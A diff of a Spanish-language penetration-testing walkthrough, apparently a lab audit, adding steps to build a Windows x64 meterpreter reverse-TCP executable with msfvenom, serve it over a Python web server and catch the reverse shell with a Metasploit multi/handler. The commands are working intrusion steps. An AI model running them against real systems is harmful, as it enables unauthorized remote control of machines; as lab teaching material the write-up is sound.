@@ -63,13 +63,15 @@ Lanzamos un análisis dirigido hacia los puertos clave de infraestructura para m
 
 Con el mapa de puertos claro, procedemos a construir nuestro vector de entrada. Generaremos un ejecutable malicioso personalizado y prepararemos el entorno en Kali Linux para interceptar la conexión reversa.
 
-### Paso 3.1: Generación del Payload Personalizado con Msfvenom
+### Paso 3.1: Generación del Binario Malicioso (Payload)
 
-Utilizamos la herramienta `msfvenom` para compilar un agente nativo de Windows en arquitectura de 64 bits. Este binario utilizará un canal TCP reverso apuntando directamente a nuestra IP de auditoría (`10.10.10.5`).
+Para dar inicio a la fase de intrusión dentro del escenario de auditoría, se procede a compilar un payload ejecutable personalizado mediante la herramienta `msfvenom`. El binario se genera bajo una arquitectura de 64 bits (`x64`) utilizando un canal de comunicación reversa TCP dirigido hacia nuestra IP de control local.
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o agente64.exe
+```
 
 ![Payload Msfvenom](creacion-payload.png)
-
-
 
 ### Paso 3.2: Transferencia del Payload al Servidor Víctima
 
@@ -79,6 +81,8 @@ Para trasladar el binario `agente64.exe` desde nuestra máquina de auditoría ha
 python3 -m http.server 80
 ```
 ![malware-agente](descarga-malware-agente.png)
+
+
 
 ### Paso 3.3: Configuración del Escuchador (Multi/Handler) en Metasploit
 Una vez que el archivo ha sido puesto a disposición en la red, regresamos a la terminal de Kali Linux para detener el servidor web temporal (mediante Ctrl + C) e iniciamos el Framework de Metasploit. Configurar el módulo genérico de escucha multi/handler es indispensable para interceptar la conexión de vuelta (Reverse TCP), asegurando que la arquitectura (x64) y los parámetros de red local coincidan plenamente con los del binario compilado.
@@ -91,3 +95,4 @@ set LHOST 10.10.10.5
 set LPORT 4444
 exploit
 ```
+![meterpreter](sesion-meterpreter.png)
